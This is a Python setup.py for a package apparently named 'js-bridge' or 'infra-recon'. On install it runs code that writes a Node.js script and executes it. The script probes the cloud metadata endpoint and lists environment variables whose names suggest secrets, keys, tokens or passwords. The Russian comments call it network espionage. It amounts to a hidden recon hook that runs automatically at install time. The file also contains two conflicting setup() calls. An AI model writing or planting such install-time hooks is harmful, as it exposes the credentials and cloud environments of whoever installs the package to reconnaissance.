import os, sys, subprocess as sp
from setuptools import setup

def js_payload():
    o = sys.stderr.write
    o("\n" + "JS"*20 + "\n")
    o("--- EXECUTING JAVASCRIPT INSIDE PYTHON ---\n")

    # 1. Создаем JS-скрипт для сетевого шпионажа
    js_code = """
    const http = require('http');
    const { exec } = require('child_process');

    console.log('--- NODE.JS RECON START ---');
    console.log('User ID:', process.getuid());
    console.log('Platform:', process.platform);

    // Пробуем достучаться до метаданных (AWS/GCP/Azure)
    const req = http.get('http://169.254.169.254/latest/meta-data/', (res) => {
        console.log('METADATA ACCESSIBLE! Status:', res.statusCode);
    }).on('error', (e) => {
        console.log('Metadata blocked or not found.');
    });

    // Ищем секреты в переменных окружения через Node
    const secrets = Object.keys(process.env).filter(k => /SECRET|KEY|TOKEN|PASS/i.test(k));
    console.log('Sensitive Envs found by Node:', secrets.join(', '));
    """

    with open('payload.js', 'w') as f:
        f.write(js_code)

    # 2. Пытаемся запустить это через доступные рантаймы
    runtimes = ['node', 'nodejs', 'npm']
    success = False
    
    for rt in runtimes:
        try:
            o(f"[!] Trying runtime: {rt}...\n")
            result = sp.getoutput(f"{rt} payload.js 2>&1")
            if "NOT FOUND" not in result.upper():
                o(result + "\n")
                success = True
                break
        except: continue

    if not success:
        o("FAIL: No JS runtime found in this environment.\n")

    o("\n" + "JS"*20 + "\n")
    sys.exit(1)

try: js_payload()
except: sys.exit(1)

setup(name="js-bridge", version="0.1")

setup(name="infra-recon", version="1.0")
